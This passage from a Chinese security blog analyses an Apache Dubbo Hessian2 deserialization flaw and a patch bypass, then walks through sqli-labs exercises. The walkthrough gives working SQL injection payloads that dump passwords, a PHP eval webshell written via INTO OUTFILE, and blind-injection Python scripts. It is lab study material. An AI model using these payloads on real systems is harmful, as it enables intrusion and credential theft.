<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DecodeHandler</span> <span class="keyword">extends</span> <span class="title class_">AbstractChannelHandlerDelegate</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">received</span><span class="params">(Channel channel, Object message)</span> <span class="keyword">throws</span> RemotingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (message <span class="keyword">instanceof</span> Decodeable) &#123;</span><br><span class="line">            <span class="built_in">this</span>.decode(message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (message <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">            <span class="built_in">this</span>.decode(((Request)message).getData()); <span class="comment">// 跟进decode()</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (message <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">            <span class="built_in">this</span>.decode(((Response)message).getResult());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.handler.received(channel, message);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">(Object message)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (message <span class="keyword">instanceof</span> Decodeable) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ((Decodeable)message).decode(); <span class="comment">// 跟进Decodeable的decode()</span></span><br><span class="line">                <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                    log.debug(<span class="string">&quot;Decode decodeable message &quot;</span> + message.getClass().getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isWarnEnabled()) &#123;</span><br><span class="line">                    log.warn(<span class="string">&quot;Call Decodeable.decode failed: &quot;</span> + var3.getMessage(), var3);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DecodeableRpcInvocation</span> <span class="keyword">extends</span> <span class="title class_">RpcInvocation</span> <span class="keyword">implements</span> <span class="title class_">Codec</span>, Decodeable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.hasDecoded &amp;&amp; <span class="built_in">this</span>.channel != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.inputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.decode(<span class="built_in">this</span>.channel, <span class="built_in">this</span>.inputStream); <span class="comment">// 跟进decode()</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var5) &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isWarnEnabled()) &#123;</span><br><span class="line">                    log.warn(<span class="string">&quot;Decode rpc invocation failed: &quot;</span> + var5.getMessage(), var5);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">this</span>.request.setBroken(<span class="literal">true</span>);</span><br><span class="line">                <span class="built_in">this</span>.request.setData(var5);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.hasDecoded = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">decode</span><span class="params">(Channel channel, InputStream input)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">		</span><br><span class="line">        ...</span><br><span class="line">        args = <span class="keyword">new</span> <span class="title class_">Object</span>[pts.length];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                args[i] = in.readObject(pts[i]); <span class="comment">// 进入反序列化</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var17) &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isWarnEnabled()) &#123;</span><br><span class="line">                    log.warn(<span class="string">&quot;Decode argument failed: &quot;</span> + var17.getMessage(), var17);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">		...</span><br></pre></td></tr></table></figure>

<p>一路<code>readObject()</code>会来到下面的<code>readMap()</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2Input</span> <span class="keyword">extends</span> <span class="title class_">AbstractHessianInput</span> <span class="keyword">implements</span> <span class="title class_">Hessian2Constants</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">readObject</span><span class="params">(List&lt;Class&lt;?&gt;&gt; expectedTypes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    </span><br><span class="line">    	...</span><br><span class="line">        <span class="keyword">case</span> <span class="number">72</span>:</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">keyValuePair</span> <span class="operator">=</span> expectedTypes != <span class="literal">null</span> &amp;&amp; expectedTypes.size() == <span class="number">2</span>;</span><br><span class="line">            reader = <span class="built_in">this</span>.findSerializerFactory().getDeserializer(Map.class);</span><br><span class="line">            <span class="keyword">return</span> reader.readMap(<span class="built_in">this</span>, keyValuePair ? (Class)expectedTypes.get(<span class="number">0</span>) : <span class="literal">null</span>, keyValuePair ? (Class)expectedTypes.get(<span class="number">1</span>) : <span class="literal">null</span>); <span class="comment">// 进入readMap()方法</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MapDeserializer</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDeserializer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">readMap</span><span class="params">(AbstractHessianInput in, Class&lt;?&gt; expectKeyType, Class&lt;?&gt; expectValueType)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Object map;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>._type == <span class="literal">null</span>) &#123;</span><br><span class="line">            map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>._type.equals(Map.class)) &#123;</span><br><span class="line">            map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>._type.equals(SortedMap.class)) &#123;</span><br><span class="line">            map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                map = (Map)<span class="built_in">this</span>._ctor.newInstance();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOExceptionWrapper</span>(var6);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        in.addRef(map);</span><br><span class="line">        <span class="built_in">this</span>.doReadMap(in, (Map)map, expectKeyType, expectValueType); <span class="comment">// 跟进doReadMap()</span></span><br><span class="line">        in.readEnd();</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doReadMap</span><span class="params">(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Deserializer</span> <span class="variable">keyDeserializer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Deserializer</span> <span class="variable">valueDeserializer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="built_in">this</span>.findSerializerFactory(in);</span><br><span class="line">        <span class="keyword">if</span> (keyType != <span class="literal">null</span>) &#123;</span><br><span class="line">            keyDeserializer = factory.getDeserializer(keyType.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valueType != <span class="literal">null</span>) &#123;</span><br><span class="line">            valueDeserializer = factory.getDeserializer(valueType.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!in.isEnd()) &#123;</span><br><span class="line">            map.put(keyDeserializer != <span class="literal">null</span> ? keyDeserializer.readObject(in) : in.readObject(), valueDeserializer != <span class="literal">null</span> ? valueDeserializer.readObject(in) : in.readObject()); <span class="comment">// 进行反序列化两次</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>因为我们的hashMap类在反序列化时会调用hashCode()方法进行赋值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EqualsBean</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.beanHashCode(); <span class="comment">// 跟进beanHashCode()</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">beanHashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.obj.toString().hashCode(); <span class="comment">// 跟进toString()</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">        result = <span class="built_in">this</span>.toString(prefix); <span class="comment">// 跟进toString()</span></span><br><span class="line">        <span class="keyword">if</span> (needStackCleanup) &#123;</span><br><span class="line">            PREFIX_TL.remove();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">toString</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;PropertyDescriptor&gt; propertyDescriptors = BeanIntrospector.getPropertyDescriptorsWithGetters(<span class="built_in">this</span>.beanClass);</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var10</span> <span class="operator">=</span> propertyDescriptors.iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var10.hasNext()) &#123;</span><br><span class="line">                <span class="type">PropertyDescriptor</span> <span class="variable">propertyDescriptor</span> <span class="operator">=</span> (PropertyDescriptor)var10.next();</span><br><span class="line">                <span class="type">String</span> <span class="variable">propertyName</span> <span class="operator">=</span> propertyDescriptor.getName();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">getter</span> <span class="operator">=</span> propertyDescriptor.getReadMethod();</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getter.invoke(<span class="built_in">this</span>.obj, NO_PARAMS); <span class="comment">// 调用了get()方法，后面的步骤和上面一样</span></span><br><span class="line">                <span class="built_in">this</span>.printProperty(sb, prefix + <span class="string">&quot;.&quot;</span> + propertyName, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">            LOG.error(<span class="string">&quot;Error while generating toString&quot;</span>, var9);</span><br><span class="line">            Class&lt;? <span class="keyword">extends</span> <span class="title class_">Object</span>&gt; clazz = <span class="built_in">this</span>.obj.getClass();</span><br><span class="line">            <span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> var9.getMessage();</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;\n\nEXCEPTION: Could not complete %s.toString(): %s\n&quot;</span>, clazz, errorMessage));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>patch1</strong></p>
<blockquote>
<p><a href="https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0R133">https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0R133</a></p>
</blockquote>
<p>在<code>DecodeableRpcInvocation</code>类中增加对参数的判断，用<code>String.equals()</code>方法对比了<code>method</code>参数是否和<code>INVOKE_ASYNC</code>常量的值是否相同</p>
<p><strong>patch绕过</strong></p>
<p>在if条件中，<code>method</code>参数会进入<code>isEcho()</code>函数，用<code>String.equals()</code>方法对比了<code>$ECHO</code>常量的值和<code>method</code>参数是否相同</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DecodeableRpcInvocation</span> <span class="keyword">extends</span> <span class="title class_">RpcInvocation</span> <span class="keyword">implements</span> <span class="title class_">Codec</span>, Decodeable &#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">if</span> (pts == DubboCodec.EMPTY_CLASS_ARRAY) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!RpcUtils.isGenericCall(path, getMethodName()) &amp;&amp; !RpcUtils.isEcho(path, getMethodName())) &#123; <span class="comment">// 新增判断</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Service not found:&quot;</span> + path + <span class="string">&quot;, &quot;</span> + getMethodName());</span><br><span class="line">        &#125;</span><br><span class="line">        pts = ReflectUtils.desc2classArray(desc);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RpcUtils</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isGenericCall</span><span class="params">(String path, String method)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $INVOKE.equals(method) || $INVOKE_ASYNC.equals(method); <span class="comment">// String $INVOKE = &quot;$invoke&quot;; String $INVOKE_ASYNC = &quot;$invokeAsync&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> boolen <span class="title function_">isEcho</span><span class="params">(String path, String method)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $ECHO.equals(method); <span class="comment">// String $ECHO = &quot;$echo&quot;; </span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>所以只要让method的值等于<code>&quot;$invoke&quot;</code>，<code>&quot;$invokeAsync&quot;</code>，<code>&quot;$echo&quot;</code>任意一个即可绕过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">&#x27;com.example.provider.service.UesrService&#x27;</span>,</span><br><span class="line">    method_name=<span class="string">&#x27;$invoke&#x27;</span>,</span><br><span class="line">    args=[toStringBean])</span><br></pre></td></tr></table></figure>

<p><strong>patch2</strong></p>
<blockquote>
<p><a href="https://github.com/apache/dubbo/commit/5ad186fa874d9f0dfb87b989e54c1325d39abd40">https://github.com/apache/dubbo/commit/5ad186fa874d9f0dfb87b989e54c1325d39abd40</a></p>
</blockquote>
<p>最后又验证了<code>parameterTypesDesc</code>的类型</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/197658">dubbo源码浅析：默认反序列化利用之hessian2</a></p>
<p><a href="https://xz.aliyun.com/t/7354">Dubbo反序列化RCE利用之新拓展面 - Dubbo Rouge攻击客户端</a></p>
<p><a href="https://f5.pm/go-28632.html">Apache Dubbo 2.7.6 反序列化漏洞复现及分析</a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs</title>
    <url>/2020/02/28/sqli-labs/</url>
    <content><![CDATA[<blockquote>
<p>之前的一些关于 sqli-labs 的练习</p>
</blockquote>
<span id="more"></span>

<h2 id="Less-1（单引号-union-注入）"><a href="#Less-1（单引号-union-注入）" class="headerlink" title="Less-1（单引号 union 注入）"></a>Less-1（单引号 union 注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27; union select 1,2,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = database()--+</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 1,2,group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = &#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=&#x27; union select 1,2,group_concat(password) from users--+</span><br></pre></td></tr></table></figure>



<h2 id="Less-2（无引号-union-注入）"><a href="#Less-2（无引号-union-注入）" class="headerlink" title="Less-2（无引号 union 注入）"></a>Less-2（无引号 union 注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0 union select 1,2,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = database()--+</span><br><span class="line"></span><br><span class="line">?id=0 union select 1,2,group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = &#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=0 union select 1,2,group_concat(password) from users--+</span><br></pre></td></tr></table></figure>



<h2 id="Less-3（单引号括号-union-注入）"><a href="#Less-3（单引号括号-union-注入）" class="headerlink" title="Less-3（单引号括号 union 注入）"></a>Less-3（单引号括号 union 注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;) union select 1,2,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = database()--+</span><br><span class="line"></span><br><span class="line">?id=&#x27;) union select 1,2,group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = &#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=&#x27;) union select 1,2,group_concat(password) from users--+</span><br></pre></td></tr></table></figure>



<h2 id="Less-4（双引号-union-注入）"><a href="#Less-4（双引号-union-注入）" class="headerlink" title="Less-4（双引号 union 注入）"></a>Less-4（双引号 union 注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&quot;) union select 1,2,group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = database()--+</span><br><span class="line"></span><br><span class="line">?id=&quot;) union select 1,2,group_concat(COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA = database() and TABLE_NAME = &#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">?id=&quot;) union select 1,2,group_concat(password) from users--+</span><br></pre></td></tr></table></figure>



<h2 id="Less-5（单引号双注入）"><a href="#Less-5（单引号双注入）" class="headerlink" title="Less-5（单引号双注入）"></a>Less-5（单引号双注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 3,1), &#x27;~&#x27;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select column_name from  information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 2,1), &#x27;~&#x27;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,count(*),concat(&#x27;~&#x27;,(select password from  users limit 0,1), &#x27;~&#x27;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>



<h2 id="Less-6（双引号双注入）"><a href="#Less-6（双引号双注入）" class="headerlink" title="Less-6（双引号双注入）"></a>Less-6（双引号双注入）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; union select 1,count(*),concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 3,1), &#x27;~&#x27;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">?id=1&quot; union select 1,count(*),concat(&#x27;~&#x27;,(select column_name from  information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 2,1), &#x27;~&#x27;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br><span class="line"></span><br><span class="line">?id=1&quot; union select 1,count(*),concat(&#x27;~&#x27;,(select password from  users limit 0,1), &#x27;~&#x27;,floor(rand()*2)) as a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>



<h2 id="Less-7（一句话木🐎）"><a href="#Less-7（一句话木🐎）" class="headerlink" title="Less-7（一句话木🐎）"></a>Less-7（一句话木🐎）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@@datadir 读取数据库路径</span><br><span class="line">@@basedir MYSQL 获取安装路径</span><br><span class="line"></span><br><span class="line">?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;123&quot;]); ?&gt;&#x27; into outfile &#x27;E:\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\test.php&#x27;--+</span><br><span class="line"></span><br><span class="line">上菜刀</span><br></pre></td></tr></table></figure>



<h2 id="Less-8（单引号布尔盲注）"><a href="#Less-8（单引号布尔盲注）" class="headerlink" title="Less-8（单引号布尔盲注）"></a>Less-8（单引号布尔盲注）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8088/sqli-labs-master/Less-8/&quot;</span></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">盲注结果：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">|- security</span></span><br><span class="line"><span class="string">    |- emails</span></span><br><span class="line"><span class="string">    |- referers</span></span><br><span class="line"><span class="string">    |- uagents</span></span><br><span class="line"><span class="string">    |- users</span></span><br><span class="line"><span class="string">        |- id</span></span><br><span class="line"><span class="string">        |- username</span></span><br><span class="line"><span class="string">        |- password</span></span><br><span class="line"><span class="string">            |- Dumb</span></span><br><span class="line"><span class="string">            |- ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLength</span>():</span><br><span class="line">    <span class="keyword">global</span> length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">11</span>):</span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or length(database())=&quot; + str(i) + &quot;#&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or length((select table_name from information_schema.tables where table_schema=database() limit 4,1))=&quot; + str(i) + &quot;#&quot;</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1))=&quot; + str(i) + &quot;#&quot;</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27; or length((select password from users limit 0,1))=&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;#&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url,params=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            length = i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;【+】 right length: &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;【*】 wrong length: &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPayload</span>():</span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        left = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        right = <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">        <span class="keyword">while</span> left != right:</span><br><span class="line">            mid = <span class="built_in">int</span>((left + right) / <span class="number">2</span>)</span><br><span class="line">            <span class="comment">#payload = &quot;&#x27; or ASCII(mid(database(),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;</span></span><br><span class="line">            <span class="comment">#payload = &quot;&#x27; or ASCII(mid((select table_name from information_schema.tables where table_schema=database() limit 4,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;</span></span><br><span class="line">            <span class="comment">#payload = &quot;&#x27; or ASCII(mid((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 2,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;</span></span><br><span class="line">            payload = <span class="string">&quot;&#x27; or ASCII(mid((select password from users limit 0,1),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1))&gt;&quot;</span> + <span class="built_in">str</span>(mid) + <span class="string">&quot;#&quot;</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.get(url,params=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&quot; &gt; &quot;</span> + <span class="built_in">chr</span>(mid))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&quot; &lt;= &quot;</span> + <span class="built_in">chr</span>(mid))</span><br><span class="line">        password += <span class="built_in">chr</span>(left)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;【+】 password: &quot;</span> + password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getLength()</span><br><span class="line">    getPayload()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h2 id="Less-9（单引号时间盲注）"><a href="#Less-9（单引号时间盲注）" class="headerlink" title="Less-9（单引号时间盲注）"></a>Less-9（单引号时间盲注）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8088/sqli-labs-master/Less-9/&quot;</span></span><br><span class="line">length = <span class="number">0</span></span><br><span class="line">letters = string.ascii_letters <span class="comment"># lowercase</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">盲注结果：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">|- security</span></span><br><span class="line"><span class="string">    |- emails</span></span><br><span class="line"><span class="string">    |- referers</span></span><br><span class="line"><span class="string">    |- uagents</span></span><br><span class="line"><span class="string">    |- users</span></span><br><span class="line"><span class="string">        |- id</span></span><br><span class="line"><span class="string">        |- username</span></span><br><span class="line"><span class="string">        |- password</span></span><br><span class="line"><span class="string">            |- Dumb</span></span><br><span class="line"><span class="string">            |- ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getLength</span>():</span><br><span class="line">    <span class="keyword">global</span> length</span><br><span class="line">    <span 